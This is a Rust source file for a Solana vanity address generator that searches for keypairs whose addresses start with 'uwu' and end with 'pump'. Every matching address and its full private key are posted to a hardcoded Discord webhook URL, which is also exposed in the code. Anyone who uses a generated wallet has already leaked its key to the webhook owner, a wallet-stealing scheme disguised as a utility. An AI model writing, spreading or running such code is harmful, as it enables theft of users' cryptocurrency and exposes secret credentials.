use std::time::Instant;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use colored::*;
use solana_sdk::signature::{Keypair, Signer};
use rayon::prelude::*;

const DISCORD_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/1497246953682112709/ExfI1JSfGPpLWuHwRl4XsWutfxPgri0r8OUKvkPj937nq2tocgMJBZSzl6IDOBAprtCt";
const BATCH_SIZE: usize = 100_000; // Parallel batch size

const PREFIX: &str = "uwu";
const SUFFIX: &str = "pump";

fn main() {
    println!("{}", "\n🚀 Solana Vanity Address Generator".bright_cyan().bold());
    println!(
        "{}",
        format!(
            "Searching for addresses starting with '{}' (case-insensitive) and ending with '{}' (case-sensitive)",
            PREFIX,
            SUFFIX
        )
        .yellow()
    );
    println!("{}", "=" .cyan());

    println!("{}", "✓ CPU parallel generation enabled".green());
    println!("{}", "Generating keypairs continuously...".green().bold());
    println!("{}", "=" .cyan());

    generate_pump_addresses_parallel();
}

fn generate_pump_addresses_parallel() {
    let start_time = Instant::now();
    let total_attempts = Arc::new(AtomicU64::new(0));
    let matches_found = Arc::new(AtomicU64::new(0));
    let mut last_log_time = start_time;
    let log_interval_secs = 2;

    loop {
        let batch_total = Arc::clone(&total_attempts);
        let batch_found = Arc::clone(&matches_found);

        // Generate a batch in parallel and only materialize matches.
        (0..BATCH_SIZE)
            .into_par_iter()
            .map(|_| {
                let keypair = Keypair::new();
                let address = keypair.pubkey().to_string();
                let starts_with_prefix = address
                    .get(..PREFIX.len())
                    .map_or(false, |candidate| candidate.eq_ignore_ascii_case(PREFIX));
                let ends_with_suffix = address.ends_with(SUFFIX);
                if starts_with_prefix && ends_with_suffix {
                    let private_key = bs58::encode(keypair.to_bytes()).into_string();
                    Some((address, private_key))
                } else {
                    None
                }
            })
            .for_each(|maybe_match| {
                batch_total.fetch_add(1, Ordering::Relaxed);

                if let Some((address, private_key)) = maybe_match {
                    batch_found.fetch_add(1, Ordering::Relaxed);

                    println!("\n{} {}", "✅ FOUND:".green().bold(), address.bright_green().bold());
                    println!("   Private Key: {}", private_key.cyan());

                    if let Err(e) = send_to_discord(&address, &private_key) {
                        eprintln!("{} {}", "⚠️  Discord error:".yellow().bold(), e);
                    } else {
                        println!("{}", "   ✓ Sent to Discord".green());
                    }
                    println!();
                }
            });

        // Log speed periodically
        let now = Instant::now();
        if now.duration_since(last_log_time).as_secs() >= log_interval_secs {
            let total = batch_total.load(Ordering::Relaxed);
            let found = batch_found.load(Ordering::Relaxed);
            let elapsed = start_time.elapsed().as_secs_f64();
            let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
            println!("{} {} addr/s | {} total | {} found",
                     "⚡".cyan(),
                     format_number(rate).bright_cyan().bold(),
                     format_number(total as f64).cyan(),
                     found.to_string().bright_green().bold());
            last_log_time = now;
        }
    }
}

fn send_to_discord(address: &str, private_key: &str) -> Result<(), String> {
    let description = format!("Address: {}\nPrivate Key: {}", address, private_key);
    let payload = serde_json::json!({
        "embeds": [
            {
                "description": description,
                "color": 3066993
            }
        ]
    });

    let client = reqwest::blocking::Client::new();
    let response = client
        .post(DISCORD_WEBHOOK_URL)
        .json(&payload)
        .send()
        .map_err(|e| e.to_string())?;

    if !response.status().is_success() {
        return Err(format!("Status {}", response.status()));
    }

    Ok(())
}

fn format_number(num: f64) -> String {
    if num >= 1_000_000.0 {
        let num_int = num.round() as u64;
        let mut s = String::new();
        let digits = num_int.to_string();
        let len = digits.len();
        
        for (i, c) in digits.chars().enumerate() {
            s.push(c);
            if (len - i - 1) % 3 == 0 && i < len - 1 {
                s.push(',');
            }
        }
        s
    } else if num >= 1_000.0 {
        let mut s = String::new();
        let num_rounded = (num * 10.0).round() / 10.0;
        let digits = format!("{:.1}", num_rounded);
        let parts: Vec<&str> = digits.split('.').collect();
        
        let int_part = parts[0];
        let len = int_part.len();
        
        for (i, c) in int_part.chars().enumerate() {
            s.push(c);
            if (len - i - 1) % 3 == 0 && i < len - 1 {
                s.push(',');
            }
        }
        
        if parts.len() > 1 && parts[1] != "0" {
            s.push('.');
            s.push_str(parts[1]);
        }
        
        s
    } else {
        format!("{:.2}", num)
    }
}
